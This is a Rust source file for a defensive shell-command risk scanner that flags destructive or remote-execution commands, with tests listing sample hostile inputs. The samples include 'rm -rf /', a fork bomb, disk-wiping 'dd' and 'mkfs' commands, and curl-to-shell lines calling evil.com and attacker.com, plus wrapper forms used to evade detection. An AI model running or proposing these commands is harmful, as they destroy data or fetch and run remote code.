// Scanner: assess(cmd) -> RiskLevel

use std::sync::Arc;

use aho_corasick::AhoCorasick;
use regex::Regex;

use crate::interceptor::RiskLevel;
use crate::interceptor::nested::recursive_scan_targets;
use crate::interceptor::parser::{ParsedCommand, Parser};
use crate::interceptor::patterns::{Pattern, PatternSet, PatternSource};

/// A single pattern match with the actual text fragment that triggered it.
#[derive(Debug, Clone)]
pub struct MatchResult {
    pub pattern: Arc<Pattern>,
    /// The substring of the scanned text that the pattern's regex matched.
    pub matched_text: String,
}

/// What ultimately caused the final interception decision.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DecisionSource {
    /// Matched one or more built-in patterns compiled into the binary.
    BuiltinPattern,
    /// Matched one or more user-defined patterns from aegis.toml.
    CustomPattern,
    /// No patterns matched; the command was assessed Safe by default.
    Fallback,
}

/// The result of assessing a shell command through the full scanner pipeline.
pub struct Assessment {
    /// The highest `RiskLevel` among all matched patterns (`Safe` when none matched).
    pub risk: RiskLevel,
    /// Every pattern that matched the command (raw + inline scripts).
    pub matched: Vec<MatchResult>,
    /// The parsed representation of the original command string.
    pub command: ParsedCommand,
}

impl Assessment {
    /// Determine what caused this assessment, ignoring allowlist (handled by the caller).
    pub fn decision_source(&self) -> DecisionSource {
        if self.matched.is_empty() {
            return DecisionSource::Fallback;
        }
        if self
            .matched
            .iter()
            .any(|m| m.pattern.source == PatternSource::Custom)
        {
            DecisionSource::CustomPattern
        } else {
            DecisionSource::BuiltinPattern
        }
    }
}

/// First-pass scanner backed by an Aho-Corasick automaton.
///
/// Every pattern contributes one or more literal keywords that *must* appear
/// in any command the pattern can match. The automaton checks all keywords in
/// a single linear pass over the command string.
///
/// `quick_scan` is the hot path:
/// - Returns `false`  → no pattern can match → caller returns `Safe` immediately.
/// - Returns `true`   → at least one keyword matched → caller runs full regex scan.
///
/// False positives (extra `true` results) are acceptable; they only cost a regex
/// scan. False negatives (a `false` when a pattern would match) are forbidden.
pub struct Scanner {
    ac: AhoCorasick,
    /// `true` when ≥ 1 pattern yielded no extractable keyword.
    /// In that case `quick_scan` always returns `true` so we never miss a match.
    has_uncovered: bool,
    /// Each pattern's regex compiled once at construction — reused on every `full_scan` call.
    ///
    /// We compile at `Scanner::new()` rather than using per-static `LazyLock<Regex>` because
    /// the pattern strings come from an embedded TOML file at runtime, not from static literals.
    /// The semantics are identical: compile once, use many times, zero recompilation overhead.
    compiled: Vec<(Arc<Pattern>, Regex)>,
}

impl Scanner {
    /// Build a [`Scanner`] from a compiled [`PatternSet`].
    ///
    /// The Aho-Corasick automaton is constructed once here; subsequent calls to
    /// [`quick_scan`] are allocation-free.
    pub fn new(patterns: PatternSet) -> Self {
        // Compile each regex once. An invalid pattern in patterns.toml is a programming error —
        // panic at startup is the correct response (fail fast, not silently skip).
        let compiled: Vec<(Arc<Pattern>, Regex)> = patterns
            .patterns
            .iter()
            .map(|p| {
                let rx = Regex::new(&p.pattern)
                    .unwrap_or_else(|e| panic!("invalid regex in pattern {}: {e}", p.id));
                (Arc::clone(p), rx)
            })
            .collect();

        let mut keywords: Vec<String> = Vec::new();
        let mut has_uncovered = false;

        for pattern in &patterns.patterns {
            let kws = extract_keywords(&pattern.pattern);
            if kws.is_empty() {
                has_uncovered = true;
            } else {
                keywords.extend(kws);
            }
        }

        keywords.sort_unstable();
        keywords.dedup();

        let ac = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(&keywords)
            .expect("all extracted keywords are valid byte strings");

        Scanner {
            ac,
            has_uncovered,
            compiled,
        }
    }

    /// Fast first pass: returns `false` only when no pattern could possibly match.
    ///
    /// A `false` result guarantees the command is `Safe` — the caller must **not**
    /// run any further checks. A `true` result means one or more keywords were
    /// found; the caller should proceed with the full regex scan (T3.4).
    ///
    /// **Complexity:** O(n) in the command length, single allocation-free pass.
    pub fn quick_scan(&self, cmd: &str) -> bool {
        self.has_uncovered || self.ac.is_match(cmd)
    }

    /// Slow path: run every compiled regex against `cmd` and return all matching patterns.
    ///
    /// Called only after `quick_scan` returns `true`. Filters out the Aho-Corasick
    /// false positives and produces the authoritative match list.
    ///
    /// **Complexity:** O(p × n) where p = number of patterns, n = command length.
    pub fn full_scan(&self, cmd: &str) -> Vec<MatchResult> {
        self.compiled
            .iter()
            .filter_map(|(pattern, rx)| {
                rx.find(cmd).map(|m| MatchResult {
                    pattern: Arc::clone(pattern),
                    matched_text: m.as_str().to_string(),
                })
            })
            .collect()
    }

    /// Assess a raw shell command and return a complete [`Assessment`].
    ///
    /// Pipeline:
    /// 1. Parse the command via [`Parser::parse`] to preserve the original command contract.
    /// 2. Run [`quick_scan`] on the raw command — if no keyword hits, return `Safe` immediately.
    /// 3. Build the recursive scan path via [`recursive_scan_targets`], unwrapping nested shells,
    ///    heredocs, inline interpreters, process substitution, and `eval` payloads.
    /// 4. Run [`full_scan`] on each discovered target and merge unique pattern matches.
    /// 5. Compute the maximum [`RiskLevel`] across all matched patterns and return.
    pub fn assess(&self, cmd: &str) -> Assessment {
        let command = Parser::parse(cmd);

        if !self.quick_scan(cmd) {
            return Assessment {
                risk: RiskLevel::Safe,
                matched: vec![],
                command,
            };
        }

        let mut matched = Vec::new();

        for target in scan_targets(cmd, &command) {
            for pattern in self.full_scan(&target) {
                if !matched
                    .iter()
                    .any(|existing: &MatchResult| existing.pattern.id == pattern.pattern.id)
                {
                    matched.push(pattern);
                }
            }
        }

        let risk = matched
            .iter()
            .map(|p| p.pattern.risk)
            .max()
            .unwrap_or(RiskLevel::Safe);

        Assessment {
            risk,
            matched,
            command,
        }
    }
}

fn scan_targets(cmd: &str, parsed: &ParsedCommand) -> Vec<String> {
    if requires_recursive_scan(cmd) {
        return recursive_scan_targets(cmd);
    }

    let mut targets = vec![cmd.to_string()];

    for segment in crate::interceptor::parser::logical_segments(cmd) {
        push_unique_target(&mut targets, segment);
    }

    for script in &parsed.inline_scripts {
        push_unique_target(&mut targets, script.body.clone());
    }

    targets
}

fn requires_recursive_scan(cmd: &str) -> bool {
    cmd.contains("<<")
        || cmd.contains("<(")
        || cmd
            .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&'))
            .any(|token| token == "eval")
}

fn push_unique_target(targets: &mut Vec<String>, target: String) {
    if !target.is_empty() && !targets.iter().any(|existing| existing == &target) {
        targets.push(target);
    }
}

// ── Keyword extraction ────────────────────────────────────────────────────────

/// Extract all required literal keywords from one regex pattern string.
///
/// Returns an empty `Vec` only when no useful keyword can be derived, which
/// causes [`Scanner::has_uncovered`] to be set and forces a full scan always.
fn extract_keywords(pattern: &str) -> Vec<String> {
    // Strip the `(?i)` case-insensitive flag — we use case-insensitive AC anyway.
    let s = pattern.strip_prefix("(?i)").unwrap_or(pattern);
    extract_inner(s)
}

fn extract_inner(s: &str) -> Vec<String> {
    // Strip a leading optional group `(...)? ` so it doesn't confuse extraction.
    // e.g. `(sudo\s+)?rm\s+...` → `rm\s+...` → keyword `rm`.
    let s = strip_leading_optional_group(s);

    let parts = split_top_alternation(s);
    if parts.len() > 1 {
        // Top-level alternation: every branch must be covered.
        // e.g. `FLUSHALL|FLUSHDB` → keywords [`flushall`, `flushdb`].
        parts.into_iter().flat_map(extract_inner).collect()
    } else {
        let lit = leading_literal(s);
        if lit.len() >= 2 {
            vec![lit.to_ascii_lowercase()]
        } else {
            // Leading literal too short — scan for any embedded literal ≥ 3 chars.
            // e.g. `>\s*/dev/sd[a-z]` → `/dev/sd`.
            find_embedded_literal(s)
                .map(|l| vec![l.to_ascii_lowercase()])
                .unwrap_or_default()
        }
    }
}

/// If `s` starts with an optional non-capturing or capturing group `(...)?`,
/// return the portion of `s` after that group; otherwise return `s` unchanged.
fn strip_leading_optional_group(s: &str) -> &str {
    if !s.starts_with('(') {
        return s;
    }
    let mut depth = 0i32;
    for (i, c) in s.char_indices() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    let after = &s[i + 1..];
                    if let Some(stripped) = after.strip_prefix('?') {
                        return stripped;
                    }
                    return s; // group is not optional → leave unchanged
                }
            }
            _ => {}
        }
    }
    s
}

/// Split `s` on `|` at nesting depth zero, skipping `\|` escape sequences.
fn split_top_alternation(s: &str) -> Vec<&str> {
    let mut depth: i32 = 0;
    let mut last = 0usize;
    let mut parts: Vec<&str> = Vec::new();
    let mut chars = s.char_indices().peekable();

    while let Some((i, c)) = chars.next() {
        match c {
            '\\' => {
                chars.next(); // skip the escaped character — `\|` is not an alternation
            }
            '(' | '[' => depth += 1,
            ')' | ']' => depth -= 1,
            '|' if depth == 0 => {
                parts.push(&s[last..i]);
                last = i + 1;
            }
            _ => {}
        }
    }
    parts.push(&s[last..]);
    parts
}

/// Extract the leading literal prefix of `s`, stopping at the first regex
/// metacharacter or shorthand class (`\s`, `\d`, …).
///
/// Handles `\X` escape sequences: `\(` → literal `(`, but `\s` → stop.
fn leading_literal(s: &str) -> String {
    let mut result = String::new();
    let mut chars = s.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\\' => match chars.peek() {
                // Regex shorthands are not literal — stop here.
                Some(
                    's' | 'S' | 'd' | 'D' | 'w' | 'W' | 'b' | 'B' | 'n' | 'r' | 't' | 'f' | 'v'
                    | 'a',
                ) => break,
                Some(_) => {
                    // Escaped literal character, e.g. `\(` → `(`.
                    result.push(chars.next().unwrap());
                }
                None => break,
            },
            '.' | '+' | '*' | '?' | '[' | '{' | '(' | ')' | '^' | '$' | '|' => break,
            _ => result.push(c),
        }
    }

    // Trim trailing whitespace that may come from patterns ending in a space.
    result.trim_end().to_string()
}

/// Walk through the pattern and return the first embedded literal sequence of
/// length ≥ 3 that is not a regex metacharacter or shorthand class.
///
/// Used as a fallback when the leading literal is too short (e.g. `>`).
fn find_embedded_literal(s: &str) -> Option<String> {
    let mut current = String::new();
    let mut chars = s.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\\' => match chars.peek() {
                Some(
                    's' | 'S' | 'd' | 'D' | 'w' | 'W' | 'b' | 'B' | 'n' | 'r' | 't' | 'f' | 'v'
                    | 'a',
                ) => {
                    chars.next();
                    if current.trim_end().len() >= 3 {
                        return Some(current.trim_end().to_string());
                    }
                    current.clear();
                }
                Some(_) => {
                    // Escaped literal char.
                    current.push(chars.next().unwrap());
                }
                None => break,
            },
            '.' | '+' | '*' | '?' | '{' | '}' | '(' | ')' | '^' | '$' | '|' => {
                if current.trim_end().len() >= 3 {
                    return Some(current.trim_end().to_string());
                }
                current.clear();
            }
            '[' => {
                // Skip character class `[...]`.
                if current.trim_end().len() >= 3 {
                    return Some(current.trim_end().to_string());
                }
                current.clear();
                for c2 in chars.by_ref() {
                    if c2 == ']' {
                        break;
                    }
                }
            }
            _ => current.push(c),
        }
    }

    if current.trim_end().len() >= 3 {
        Some(current.trim_end().to_string())
    } else {
        None
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::UserPattern;
    use crate::interceptor::patterns::Category;

    fn scanner() -> Scanner {
        let patterns = PatternSet::load().expect("patterns.toml must load");
        Scanner::new(patterns)
    }

    // ── safe commands ────────────────────────────────────────────────────────

    #[test]
    fn safe_commands_not_flagged() {
        let s = scanner();
        // Note: commands containing AC keywords (e.g. "echo" from EXEC-001) correctly
        // trigger quick_scan=true even when safe — false positives are acceptable, they
        // only cost one extra regex pass. This list tests commands with no AC keywords at all.
        for cmd in [
            "ls -la /home/user",
            "cat /etc/hostname",
            "cargo build --release",
            "grep -r TODO src/",
            "cd /tmp",
            "pwd",
            "whoami",
            "date",
            "uname -a",
        ] {
            assert!(!s.quick_scan(cmd), "expected false for safe command: {cmd}");
        }
    }

    // ── dangerous commands are flagged ───────────────────────────────────────

    #[test]
    fn filesystem_patterns_flagged() {
        let s = scanner();
        assert!(s.quick_scan("rm -rf /home/user"));
        assert!(s.quick_scan("find /var -delete"));
        assert!(s.quick_scan("dd if=/dev/zero of=/dev/sda"));
        assert!(s.quick_scan("shred -u secrets.txt"));
        assert!(s.quick_scan("truncate -s 0 important.log"));
        assert!(s.quick_scan("mkfs.ext4 /dev/sdb1"));
        assert!(s.quick_scan("chmod 777 /var/www"));
        assert!(s.quick_scan("chown -R nobody /"));
        assert!(s.quick_scan("echo data > /dev/sda"));
        assert!(s.quick_scan("mv /etc/passwd /tmp/"));
    }

    #[test]
    fn git_patterns_flagged() {
        let s = scanner();
        assert!(s.quick_scan("git reset --hard HEAD~3"));
        assert!(s.quick_scan("git clean -fd ."));
        assert!(s.quick_scan("git push origin main --force"));
        assert!(s.quick_scan("git filter-branch --tree-filter 'rm secret'"));
        assert!(s.quick_scan("git stash drop stash@{0}"));
    }

    #[test]
    fn database_patterns_flagged() {
        let s = scanner();
        assert!(s.quick_scan("DROP TABLE users;"));
        assert!(s.quick_scan("drop table orders;")); // case-insensitive
        assert!(s.quick_scan("DELETE FROM accounts;"));
        assert!(s.quick_scan("TRUNCATE TABLE logs;"));
        assert!(s.quick_scan("FLUSHALL"));
        assert!(s.quick_scan("FLUSHDB")); // second alternative
        assert!(s.quick_scan("mongorestore --accept-data-loss"));
        assert!(s.quick_scan("ALTER TABLE t DROP COLUMN col;"));
    }

    #[test]
    fn cloud_patterns_flagged() {
        let s = scanner();
        assert!(s.quick_scan("terraform destroy"));
        assert!(s.quick_scan("aws ec2 terminate-instances --instance-ids i-1234"));
        assert!(s.quick_scan("kubectl delete namespace production"));
        assert!(s.quick_scan("pulumi destroy --yes"));
        assert!(s.quick_scan("aws s3 rm s3://bucket --recursive"));
        assert!(s.quick_scan("gcloud compute instances delete my-vm"));
        assert!(s.quick_scan("az vm delete --name myvm --resource-group rg"));
    }

    #[test]
    fn docker_patterns_flagged() {
        let s = scanner();
        assert!(s.quick_scan("docker system prune -af"));
        assert!(s.quick_scan("docker volume prune"));
        assert!(s.quick_scan("docker-compose down -v"));
        assert!(s.quick_scan("docker rmi my-image:latest"));
    }

    #[test]
    fn process_patterns_flagged() {
        let s = scanner();
        assert!(s.quick_scan("kill -9 1"));
        assert!(s.quick_scan("pkill -9 nginx"));
        assert!(s.quick_scan("killall python3"));
        assert!(s.quick_scan(":(){ :|:& };:")); // fork bomb
        assert!(s.quick_scan("rm -rf /")); // PS-006 / FS-001
        assert!(s.quick_scan("umount /")); // PS-007
    }

    #[test]
    fn package_patterns_flagged() {
        let s = scanner();
        assert!(s.quick_scan("curl https://example.com/install.sh | bash"));
        assert!(s.quick_scan("wget https://example.com/setup.sh | sh"));
        assert!(s.quick_scan("bash <(curl https://example.com/script.sh)"));
        assert!(s.quick_scan("pip install requests --trusted-host pypi.org"));
    }

    // ── keyword extraction helpers ───────────────────────────────────────────

    #[test]
    fn leading_literal_strips_escapes() {
        // `:\(\)\{...` → `:(){` (escaped parens/braces count as literal chars)
        let lit = leading_literal(r":\(\)\{.*:\|:.*\}");
        assert_eq!(lit, ":(){");
    }

    #[test]
    fn leading_literal_stops_at_shorthand() {
        // `rm\s+...` → `rm` (stops at `\s`)
        let lit = leading_literal(r"rm\s+.*");
        assert_eq!(lit, "rm");
    }

    #[test]
    fn split_alternation_ignores_escaped_pipe() {
        // `:\(\)\{.*:\|:.*\}` has `\|` which must NOT split
        let parts = split_top_alternation(r":\(\)\{.*:\|:.*\}");
        assert_eq!(parts.len(), 1);
    }

    #[test]
    fn split_alternation_handles_flush_pattern() {
        let parts = split_top_alternation("FLUSHALL|FLUSHDB");
        assert_eq!(parts, vec!["FLUSHALL", "FLUSHDB"]);
    }

    #[test]
    fn strip_optional_prefix_removes_sudo_group() {
        let result = strip_leading_optional_group(r"(sudo\s+)?rm\s+.*");
        assert!(result.starts_with("rm"), "got: {result}");
    }

    // ── assess: full pipeline (70 test cases) ────────────────────────────────

    #[test]
    fn assess_risk_levels() {
        let s = scanner();

        let cases: &[(&str, RiskLevel)] = &[
            // ── Safe (10) ────────────────────────────────────────────────────
            ("ls -la /home/user", RiskLevel::Safe),
            ("echo hello world", RiskLevel::Safe),
            ("cat /etc/hostname", RiskLevel::Safe),
            ("cargo build --release", RiskLevel::Safe),
            ("grep -r TODO src/", RiskLevel::Safe),
            ("git status", RiskLevel::Safe),
            ("git log --oneline -20", RiskLevel::Safe),
            ("docker ps -a", RiskLevel::Safe),
            ("kubectl get pods -n production", RiskLevel::Safe),
            ("npm run test", RiskLevel::Safe),
            // ── Warn (20) ────────────────────────────────────────────────────
            // FS-005: truncate to zero bytes
            ("truncate -s 0 data.log", RiskLevel::Warn),
            // FS-007: chmod with world-writable group bits (not root path → no PS-005)
            ("chmod 775 /var/www/html", RiskLevel::Warn),
            // FS-008: recursive chown
            ("chown -R www-data:www-data /var/www", RiskLevel::Warn),
            // GIT-001: reset --hard
            ("git reset --hard HEAD~1", RiskLevel::Warn),
            // GIT-002: clean -f
            ("git clean -fd src/", RiskLevel::Warn),
            // GIT-003: push --force
            ("git push origin main --force", RiskLevel::Warn),
            // GIT-003: push --force-with-lease is still Warn
            (
                "git push origin feature --force-with-lease",
                RiskLevel::Warn,
            ),
            // GIT-005: rebase
            ("git rebase -i HEAD~3", RiskLevel::Warn),
            // GIT-006: branch -D
            ("git branch -D feature/old-experiment", RiskLevel::Warn),
            // GIT-007: checkout -- .
            ("git checkout -- .", RiskLevel::Warn),
            // GIT-008: stash drop
            ("git stash drop stash@{0}", RiskLevel::Warn),
            // GIT-008: stash clear
            ("git stash clear", RiskLevel::Warn),
            // DB-008: ALTER TABLE DROP COLUMN
            ("ALTER TABLE users DROP COLUMN avatar;", RiskLevel::Warn),
            // CL-003: kubectl delete (non-namespace resource → Warn only)
            ("kubectl delete deployment my-app", RiskLevel::Warn),
            // CL-009: aws iam delete
            ("aws iam delete-role my-service-role", RiskLevel::Warn),
            // DK-001: docker system prune
            ("docker system prune -f", RiskLevel::Warn),
            // DK-002: docker volume prune
            ("docker volume prune -f", RiskLevel::Warn),
            // DK-003: docker-compose down -v
            ("docker-compose down -v", RiskLevel::Warn),
            // DK-004: docker rmi
            ("docker rmi my-image:latest", RiskLevel::Warn),
            // PKG-005: pip --trusted-host
            (
                "pip install requests --trusted-host pypi.org",
                RiskLevel::Warn,
            ),
            // ── Danger (30) ──────────────────────────────────────────────────
            // FS-001: rm -rf (non-root path → Danger, not Block)
            ("rm -rf /home/user/old-project", RiskLevel::Danger),
            // FS-001: rm with long form flags
            ("rm --recursive --force /tmp/build", RiskLevel::Danger),
            // FS-002: find -delete
            ("find /var/log -name '*.log' -delete", RiskLevel::Danger),
            // FS-002: find -exec rm
            ("find /tmp -exec rm {} \\;", RiskLevel::Danger),
            // FS-003: dd to block device
            ("dd if=/dev/zero of=/dev/sda bs=1M", RiskLevel::Danger),
            // FS-004: shred
            ("shred -uzn 3 secrets.key", RiskLevel::Danger),
            // FS-010: mv /etc contents
            ("mv /etc/hosts /tmp/hosts.bak", RiskLevel::Danger),
            // GIT-004: filter-branch
            (
                "git filter-branch --tree-filter 'rm -f secret.txt' HEAD",
                RiskLevel::Danger,
            ),
            // DB-001: DROP TABLE
            ("DROP TABLE users;", RiskLevel::Danger),
            // DB-001: DROP TABLE (case-insensitive)
            ("drop table orders cascade;", RiskLevel::Danger),
            // DB-002: DROP DATABASE
            ("DROP DATABASE myapp_production;", RiskLevel::Danger),
            // DB-003: DELETE FROM without WHERE
            ("DELETE FROM accounts;", RiskLevel::Danger),
            // DB-004: TRUNCATE TABLE
            ("TRUNCATE TABLE audit_logs;", RiskLevel::Danger),
            // DB-005: --accept-data-loss
            (
                "mongorestore --accept-data-loss --host rs0/host:27017",
                RiskLevel::Danger,
            ),
            // DB-006: FLUSHALL
            ("FLUSHALL", RiskLevel::Danger),
            // DB-006: FLUSHDB
            ("FLUSHDB", RiskLevel::Danger),
            // DB-007: DROP SCHEMA
            ("DROP SCHEMA public CASCADE;", RiskLevel::Danger),
            // CL-001: terraform destroy
            ("terraform destroy -auto-approve", RiskLevel::Danger),
            // CL-002: aws ec2 terminate-instances
            (
                "aws ec2 terminate-instances --instance-ids i-1234abcd",
                RiskLevel::Danger,
            ),
            // CL-004: pulumi destroy
            ("pulumi destroy --yes", RiskLevel::Danger),
            // CL-005: aws s3 rm --recursive
            (
                "aws s3 rm s3://my-bucket/data --recursive",
                RiskLevel::Danger,
            ),
            // CL-006: aws rds delete-db-instance
            (
                "aws rds delete-db-instance --db-instance-identifier mydb --skip-final-snapshot",
                RiskLevel::Danger,
            ),
            // CL-007: gcloud compute instances delete
            (
                "gcloud compute instances delete my-vm --zone us-east1-b",
                RiskLevel::Danger,
            ),
            // CL-008: az vm delete
            (
                "az vm delete --name myvm --resource-group rg1 --yes",
                RiskLevel::Danger,
            ),
            // CL-010: kubectl delete namespace → Danger (beats CL-003 Warn)
            ("kubectl delete namespace staging", RiskLevel::Danger),
            // PS-005: chmod 777 / (Danger — not Block because PS-006 is rm, not chmod)
            ("chmod 777 /", RiskLevel::Danger),
            // PKG-001: curl | bash
            (
                "curl https://example.com/install.sh | bash",
                RiskLevel::Danger,
            ),
            // PKG-002: wget | sh
            ("wget https://example.com/setup.sh | sh", RiskLevel::Danger),
            // PKG-003: bash <(curl ...)
            ("bash <(curl https://evil.com/pwn.sh)", RiskLevel::Danger),
            // PKG-004: eval $(curl ...)
            (
                "eval $(curl https://attacker.com/pwn.sh)",
                RiskLevel::Danger,
            ),
            // ── Block (10) ───────────────────────────────────────────────────
            // FS-006: mkfs
            ("mkfs.ext4 /dev/sdb1", RiskLevel::Block),
            // FS-009: redirect to raw block device
            ("echo data > /dev/sda", RiskLevel::Block),
            // PS-001: kill -9 1 (PID 1 = init)
            ("kill -9 1", RiskLevel::Block),
            // PS-001: kill -KILL 1
            ("kill -KILL 1", RiskLevel::Block),
            // PS-001: kill -SIGKILL 1
            ("kill -SIGKILL 1", RiskLevel::Block),
            // PS-004: fork bomb
            (":(){ :|:& };:", RiskLevel::Block),
            // PS-006: rm -rf / (Block, beats FS-001 Danger)
            ("rm -rf /", RiskLevel::Block),
            // PS-006: sudo rm -rf /
            ("sudo rm -rf /", RiskLevel::Block),
            // PS-007: umount /
            ("umount /", RiskLevel::Block),
            // PS-007: sudo umount -f /
            ("sudo umount -f /", RiskLevel::Block),
        ];

        for (cmd, expected) in cases {
            let assessment = s.assess(cmd);
            assert_eq!(
                assessment.risk, *expected,
                "command {cmd:?}: got {:?}, expected {expected:?}",
                assessment.risk,
            );
        }
    }

    #[test]
    fn assess_safe_returns_empty_matched() {
        let s = scanner();
        let a = s.assess("echo hello");
        assert_eq!(a.risk, RiskLevel::Safe);
        assert!(a.matched.is_empty());
    }

    #[test]
    fn custom_pattern_changes_assessment_and_marks_custom_source() {
        let custom = UserPattern {
            id: "USR-ASS-001".to_string(),
            category: Category::Process,
            risk: RiskLevel::Danger,
            pattern: r"deploy-prod-now".to_string(),
            description: "Project-specific destructive deploy shortcut".to_string(),
            safe_alt: Some("deploy-prod-now --dry-run".to_string()),
        };

        let patterns =
            PatternSet::from_sources(&[custom]).expect("merged builtin+custom set should load");
        let scanner = Scanner::new(patterns);

        let assessment = scanner.assess("echo ok && deploy-prod-now");
        assert_eq!(assessment.risk, RiskLevel::Danger);
        assert_eq!(assessment.decision_source(), DecisionSource::CustomPattern);
        assert!(
            assessment
                .matched
                .iter()
                .any(|m| m.pattern.id.as_ref() == "USR-ASS-001"
                    && m.pattern.source == PatternSource::Custom),
            "expected USR-ASS-001 custom match in assessment"
        );
    }

    #[test]
    fn assess_danger_has_matched_patterns() {
        let s = scanner();
        let a = s.assess("rm -rf /home/user/project");
        assert!(
            !a.matched.is_empty(),
            "expected at least one matched pattern"
        );
        assert_eq!(a.risk, RiskLevel::Danger);
    }

    #[test]
    fn assess_block_beats_danger() {
        // rm -rf / matches both FS-001 (Danger) and PS-006 (Block) — Block wins.
        let s = scanner();
        let a = s.assess("rm -rf /");
        assert_eq!(a.risk, RiskLevel::Block);
        let ids: Vec<&str> = a.matched.iter().map(|m| m.pattern.id.as_ref()).collect();
        assert!(
            ids.contains(&"PS-006"),
            "PS-006 must be in matched: {ids:?}"
        );
    }

    #[test]
    fn assess_preserves_raw_command() {
        let s = scanner();
        let cmd = "git reset --hard HEAD~1";
        let a = s.assess(cmd);
        assert_eq!(a.command.raw, cmd);
    }

    // ── assess: compound command classification ───────────────────────────────
    //
    // Rule: the risk of a compound command is the highest risk across all segments.

    #[test]
    fn assess_compound_commands() {
        let s = scanner();

        let cases: &[(&str, RiskLevel)] = &[
            // Safe first segment, Danger second — result is Danger
            ("echo ok && rm -rf /home/user/project", RiskLevel::Danger),
            // Safe first segment, Block second — result is Block
            ("echo ok && rm -rf /", RiskLevel::Block),
            // Semicolon with no space after slash — Block must still fire
            // (this is the core bug per-segment scanning fixes: PS-006 requires /(\s|$),
            // and in the raw string `rm -rf /;echo done` the `/` is followed by `;`)
            ("rm -rf /;echo done", RiskLevel::Block),
            ("rm -rf /&&echo done", RiskLevel::Block),
            // Block first, safe second — Block wins
            ("rm -rf / && echo done", RiskLevel::Block),
            // Danger in middle segment of three
            ("echo a; DROP TABLE users; echo b", RiskLevel::Danger),
            // Block in last segment of three
            ("echo a; echo b; rm -rf /", RiskLevel::Block),
            // Danger via pipe right-hand side
            (
                "echo creds | aws ec2 terminate-instances --instance-ids i-1234",
                RiskLevel::Danger,
            ),
            // || fallback is dangerous
            (
                "false || terraform destroy -auto-approve",
                RiskLevel::Danger,
            ),
            // All segments safe — result is Safe
            ("echo hello && ls /tmp && pwd", RiskLevel::Safe),
        ];

        for (cmd, expected) in cases {
            let assessment = s.assess(cmd);
            assert_eq!(
                assessment.risk, *expected,
                "compound command {cmd:?}: got {:?}, expected {expected:?}",
                assessment.risk,
            );
        }
    }

    // ── assess: bypass-prone command forms ───────────────────────────────────
    //
    // For each form the raw string always reaches the Aho-Corasick + regex scan,
    // so dangerous payloads wrapped in these shells/operators are still caught.

    #[test]
    fn assess_bypass_prone_forms() {
        let s = scanner();

        let cases: &[(&str, RiskLevel)] = &[
            // sh -c wrapping a Block payload.
            // The tokenizer strips the surrounding quotes; the reconstructed segment is
            // `sh -c rm -rf /` where `/` is at end-of-segment → PS-006 `(\s|$)` fires.
            ("sh -c 'rm -rf /'", RiskLevel::Block),
            // bash -c with a SQL payload
            ("bash -c 'DROP TABLE users;'", RiskLevel::Danger),
            // bash -lc: combined login+command flag — same quote-stripping effect → Block
            ("bash -lc 'rm -rf /'", RiskLevel::Block),
            // bash -ic: combined interactive+command flag
            (
                "bash -ic 'terraform destroy -auto-approve'",
                RiskLevel::Danger,
            ),
            // bash --login -c: long login flag before -c
            (
                "bash --login -c 'kubectl delete namespace production'",
                RiskLevel::Danger,
            ),
            // env-prefix without 'env' keyword — raw string is still fully scanned
            (
                "MY_VAR=x bash -c 'aws ec2 terminate-instances --instance-ids i-1234'",
                RiskLevel::Danger,
            ),
            // heredoc: dangerous command on its own line → followed by \n → PS-006 (\s|$) matches
            ("bash <<EOF\nrm -rf /\nEOF", RiskLevel::Block),
            // heredoc: non-root dangerous path → FS-001 Danger
            (
                "bash <<EOF\nrm -rf /home/user/project\nEOF",
                RiskLevel::Danger,
            ),
            // pipe chain: right-hand segment `bash -c rm -rf /` — quotes stripped → Block
            ("echo safe | bash -c 'rm -rf /'", RiskLevel::Block),
            // semicolon chain: dangerous second command in raw string
            ("echo ok; terraform destroy", RiskLevel::Danger),
            // && chain: dangerous right-hand side in raw string
            ("ls && DROP TABLE users;", RiskLevel::Danger),
            // || chain: dangerous fallback command in raw string
            (
                "false || kubectl delete namespace staging",
                RiskLevel::Danger,
            ),
            // command substitution: normalized inner command restores end-of-command semantics
            ("echo $(rm -rf /)", RiskLevel::Block),
            // subshell grouping: normalized inner command restores end-of-command semantics
            ("(rm -rf /)", RiskLevel::Block),
            // python -c inline script: body scanned separately, trailing `'` → Danger
            (
                r#"python3 -c "import os; os.system('rm -rf /')""#,
                RiskLevel::Danger,
            ),
            // double-quoted fragment: space after `/` before `&&` → PS-006 (\s|$) matches → Block
            (r#"bash -c "rm -rf / && echo done""#, RiskLevel::Block),
        ];

        for (cmd, expected) in cases {
            let assessment = s.assess(cmd);
            assert_eq!(
                assessment.risk, *expected,
                "bypass form {cmd:?}: got {:?}, expected {expected:?}",
                assessment.risk,
            );
        }
    }

    // ── assess: indirect / encoded execution patterns ────────────────────────
    //
    // EXEC-001: echo | sh/bash     (indirect shell execution of a string)
    // EXEC-002: python -c          (inline Python interpreter)
    // EXEC-003: node -e            (inline Node.js interpreter)
    // EXEC-004: perl -e            (inline Perl interpreter)
    // EXEC-005: eval "$VAR"        (eval with unexpandable variable)
    // EXEC-006: cmd <(...)         (process substitution as shell input)

    #[test]
    fn assess_indirect_execution_forms() {
        let s = scanner();

        let cases: &[(&str, RiskLevel)] = &[
            // ── EXEC-001: echo payload | sh ──────────────────────────────────
            ("echo 'ls /tmp' | sh", RiskLevel::Danger),
            ("echo malicious_payload | bash", RiskLevel::Danger),
            // ── EXEC-002: python -c ──────────────────────────────────────────
            ("python -c 'import sys'", RiskLevel::Warn),
            ("python3 -c \"print('hi')\"", RiskLevel::Warn),
            ("python2 -ic \"import os\"", RiskLevel::Warn),
            // ── EXEC-003: node -e ────────────────────────────────────────────
            ("node -e 'console.log(1)'", RiskLevel::Warn),
            ("nodejs -e 'process.version'", RiskLevel::Warn),
            // ── EXEC-004: perl -e ────────────────────────────────────────────
            ("perl -e 'print 42'", RiskLevel::Warn),
            // ── EXEC-005: eval with variable ─────────────────────────────────
            ("eval \"$DEPLOY_CMD\"", RiskLevel::Warn),
            ("eval $INIT_SCRIPT", RiskLevel::Warn),
            ("eval \"${MY_BOOTSTRAP_SCRIPT}\"", RiskLevel::Warn),
            // ── EXEC-006: sh/bash <(...) ─────────────────────────────────────
